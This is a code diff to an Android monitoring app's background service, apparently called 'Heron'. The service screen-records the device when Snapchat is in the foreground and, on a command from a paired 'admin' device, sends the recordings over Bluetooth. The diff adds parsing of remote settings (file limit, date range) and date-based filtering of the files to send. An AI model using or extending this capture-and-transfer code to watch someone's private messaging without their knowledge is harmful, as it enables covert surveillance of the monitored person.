@@ -13,8 +13,10 @@ import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.bluetooth.BluetoothAdapter;
 import android.bluetooth.BluetoothDevice;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
@@ -29,6 +31,7 @@ import android.os.IBinder;
 import android.os.Message;
 import android.os.SystemClock;
 import android.support.v4.app.NotificationCompat;
+import android.support.v4.content.LocalBroadcastManager;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
@@ -105,7 +108,13 @@ public class MyService extends Service {
     private int duration_msec;
     private boolean deleteafter;
     private boolean recordmic;
+    private BroadcastReceiver mReceiver;
 
+    private String retrievalLimit;
+    private boolean resetHistory;
+    private int calOptions;
+    private long datefar;
+    private long datenear;
 
 
 
@@ -240,7 +249,17 @@ public class MyService extends Service {
         DISPLAY_WIDTH = width;
         DISPLAY_HEIGHT = height;
 
-        Toast.makeText(this, "Service onCreate method.", Toast.LENGTH_LONG).show();
+
+        //receiver to update settings
+
+        LocalBroadcastManager.getInstance(this).registerReceiver(mMessageReceiver,
+                new IntentFilter("custom-event-name"));
+
+
+
+
+
+      //  Toast.makeText(this, "Service onCreate method.", Toast.LENGTH_LONG).show();
         super.onCreate();
     }
 
@@ -345,11 +364,15 @@ public class MyService extends Service {
                             deleteFiles(filePaths.get(filePaths.size() - filesToSend));
                         }else{
                             Set<String> set = prefs.getStringSet("already_sent", null);
+                            if(set == null){
+                                set = new HashSet<String>();
+                            }
                             String path = filePaths.get(filePaths.size() - filesToSend);
                             System.out.println("filepaths size:" + filePaths.size()+ " filesToSend: "+filesToSend);
                             System.out.println("filepath: " + path);
                            // System.out.println("filepath sep index: " + path.lastIndexOf(File.separator)+1);
-                            System.out.println("filepath sep index: " + path.lastIndexOf("/")+1);
+                            System.out.println("filepath sep index: " + path.lastIndexOf("/"));
+                            System.out.println("substring is: "+path.substring(path.lastIndexOf(File.separator)+1));
                             //get filename from path
                             set.add(path.substring(path.lastIndexOf(File.separator)+1));
                             edt.putStringSet("already_sent", set);
@@ -404,20 +427,54 @@ public class MyService extends Service {
             }
         };
 
-        //THE RECEIVING DEVICE
+        //RECEIVE MESSAGE FROM ADMIN DEVICE
         MyApplication.serverHandler = new Handler() {
             @Override
             public void handleMessage(Message message) {
                 switch (message.what) {
                     case zMessageType.DATA_RECEIVED: {
                         byte[] myBytes = ((byte[]) message.obj);
+                        // SHORT MESSAGE PROVIDES SETTINGS AND SIGNALS SERVICE TO SEND PHOTOS
                         if(myBytes.length < 100) {
                             if (prefs.getString("type", "").equals("monitored")) {
 
+                                Toast.makeText(getApplicationContext(), "Received Prompt Message", Toast.LENGTH_LONG).show();
+
                             String s = new String(myBytes);
+                            System.out.println("received string: "+s);
+                            int[] indecies = {0,0,0,0,0,0};
+                            for(int i=0;i<5;i++){
+                                indecies[i+1] = s.indexOf("/",indecies[i]+1);
+                            }
+                            System.out.println("indecies: "+indecies[0]+" "+indecies[1]+" "+indecies[2]+" "+indecies[3]+" "+indecies[4]+" "+indecies[5]);
+                            retrievalLimit =(s.substring(indecies[1]+1,indecies[2]));
+                            resetHistory = Boolean.parseBoolean(s.substring(indecies[2]+1,indecies[3]));
+                            calOptions = Integer.parseInt(s.substring(indecies[3]+1, indecies[4]));
+                            datefar = Long.parseLong(s.substring(indecies[4]+1, indecies[5]));
+                            datenear = Long.parseLong(s.substring(indecies[5]+1));
+                            System.out.println("retrieval limit: "+ retrievalLimit);
+                            System.out.println("reset history: "+ resetHistory);
+                            System.out.println("caloptions : "+ calOptions);
+                            System.out.println("datefar : "+ datefar);
+                            System.out.println("datenear : "+ datenear);
+
+
+
+
                             System.out.println("data received "+s);
-                            if(s.equals("Test String")) {
+                            if(s.substring(0,11).equals("Test String")) {
                                 populateList();
+
+                                if(retrievalLimit.equals("No Limit")){
+                                    //do nothing, default filesToSend from file list
+                                }else{
+                                    int limit = Integer.parseInt(retrievalLimit);
+                                    if(filesToSend > limit) {
+                                        filesToSend = limit;
+                                    }
+                                    System.out.println("limit set to: "+filesToSend);
+                                }
+
 
                                 if (progressDialog != null) {
                                     progressDialog.dismiss();
@@ -428,6 +485,9 @@ public class MyService extends Service {
                                 }
                                 if(filesToSend>0) {
                                     sendFile();
+                                }else{
+                                    //send message there are no files to receive
+                                    sendString("no files to receive");
                                 }
                                 System.out.println("SHOULD SEND FILES "+filesToSend);
                             }
@@ -435,6 +495,8 @@ public class MyService extends Service {
 
 
                         }else {
+
+                            //TODO send message to close retrieving files popup
                             //service should not be receiving the large files.
                   /*          if (prefs.getString("type", "").equals("admin")) {
                                 System.out.println("data received, byte length >100 ");
@@ -538,10 +600,11 @@ public class MyService extends Service {
             currentApp = tasks.get(0).processName;
         }
 
-        Log.e("adapter", "Current App in foreground is: " + currentApp);
+     //ENABLE THIS FOR PERIODIC REPORTING
+     //   Log.e("adapter", "Current App in foreground is: " + currentApp);
+     //   System.out.println(isRecording.toString() +" "+ dayCount +" "+ dayStored +" "+ totalCount +" "+ totalStored+" "+frequency);
 
 
-        System.out.println(isRecording.toString() +" "+ dayCount +" "+ dayStored +" "+ totalCount +" "+ totalStored+" "+frequency);
         //TESTING SCREEN RECORD WITH snapchat open
        // if(currentApp.equals("com.snapchat.android") && isRecording==false && (dayCount <= dayStored) && (totalCount <= totalStored) && (getRandomNumber(0,100) <= frequency)){
         if(currentApp.equals("com.snapchat.android") && isRecording==false){
@@ -675,6 +738,8 @@ public class MyService extends Service {
      /*   Intent intent = new Intent("restartApps");
         sendBroadcast(intent);
 */
+        LocalBroadcastManager.getInstance(this).unregisterReceiver(mMessageReceiver);
+
         Intent restartService = new Intent(getApplicationContext(),
                 this.getClass());
 
@@ -995,28 +1060,37 @@ public class MyService extends Service {
             }
 
         Set<String> set = prefs.getStringSet("already_sent", null);
+
         filePaths.clear();
+
+        System.out.println("date far: "+datefar);
+        System.out.println("date near: "+datenear);
 
         //TODO something wrong here? names of files not correct? filepaths not being populated...
         for (int i = 0; i < theNamesOfFiles.length; i++) {
                 //   theNamesOfFiles[i] = filelist[i].getName();
                 if (filelist[i].length() > 0) {
+                    //Check date of file.
+                    System.out.println("modified times: "+filelist[i].lastModified());
+
+
 
                     //check if we have already sent the file, if not, add to filePaths that are sendable
                   //  if(set!=null && !set.contains(filelist[i].getName())) {
+
+                    if(filelist[i].lastModified()>datefar && filelist[i].lastModified() < datenear) {
                         filePaths.add(filelist[i].getAbsolutePath());
                         System.out.println("Files: " + filePaths);
+                    }
+
                   //  }
                 }
             }
 
+            System.out.println("filestosend SET: "+filesToSend);
             filesToSend = filePaths.size();
     }
 
-    //TODO have to give monitored way to select paired device
-    //TODO have to make progress indicator
-    //TODO Long press delete still a thing?
-    //TODO file management
 
     public void sendFile() {
        // populateList();
@@ -1027,8 +1101,10 @@ public class MyService extends Service {
         System.out.println("try to send file deviceID: " + deviceID);
 
         if (MyApplication.pairedDevices != null) {
+            boolean deviceFound = false;
             for (BluetoothDevice device : MyApplication.adapter.getBondedDevices()) {
                 if (device.getAddress().contains(deviceID)) {
+                    deviceFound = true;
                     System.out.println("starting client thread");
                     if (MyApplication.clientThread != null) {
                         System.out.println("canceled client thread");
@@ -1038,33 +1114,36 @@ public class MyService extends Service {
                     MyApplication.clientThread.start();
                 }
             }
-            //Have to call delayed so client thread has a chance to start
-            final Handler handler = new Handler();
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    System.out.println("DELAYED FILE TRANSFER TEST "+filePaths);
+            if(deviceFound == true) {
+                //Have to call delayed so client thread has a chance to start
+                final Handler handler = new Handler();
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        System.out.println("DELAYED FILE TRANSFER TEST " + filePaths);
 
-                    if(filePaths.size()>0) {
-                        String videopath = filePaths.get(filePaths.size() - filesToSend);
-                        System.out.println("filepath: " + videopath);
-                        byte[] myBytes = new byte[0];
-                        try {
-                            myBytes = fullyReadFileToBytes(videopath);
-                        } catch (IOException e) {
-                            e.printStackTrace();
-                            System.out.println("service io exception: " + e.getMessage());
+                        if (filePaths.size() > 0) {
+                            String videopath = filePaths.get(filePaths.size() - filesToSend);
+                            System.out.println("filepath: " + videopath);
+                            byte[] myBytes = new byte[0];
+                            try {
+                                myBytes = fullyReadFileToBytes(videopath);
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                                System.out.println("service io exception: " + e.getMessage());
+                            }
+
+                            // Invoke client thread to send
+                            Message message = new Message();
+                            message.obj = myBytes;
+                            System.out.println("handlertest: " + MyApplication.clientThread.incomingHandler.toString());
+                            MyApplication.clientThread.incomingHandler.sendMessage(message);
                         }
-
-                        // Invoke client thread to send
-                        Message message = new Message();
-                        message.obj = myBytes;
-                        // System.out.println("handlertest: " + MyApplication.clientThread.incomingHandler.toString());
-                        MyApplication.clientThread.incomingHandler.sendMessage(message);
                     }
-                }
-            }, 3000);
-
+                }, 3000);
+            }else{
+                Toast.makeText(this, "Heron - Select Correct Admin Device and Pair", Toast.LENGTH_LONG).show();
+            }
 
         } else {
 
@@ -1084,5 +1163,25 @@ public class MyService extends Service {
     }
 
 
+    private BroadcastReceiver mMessageReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            // Get extra data included in the Intent
+            String message = intent.getStringExtra("message");
+            System.out.println("Got message: " + message);
+        }
+    };
 
-}
+    private void sendString(String message) {
+        byte[] myBytes = message.getBytes();
+
+        // Invoke client thread to send
+        Message mMessage = new Message();
+        mMessage.obj = myBytes;
+        MyApplication.clientThread.incomingHandler.sendMessage(mMessage);
+
+    }
+
+
+
+    }
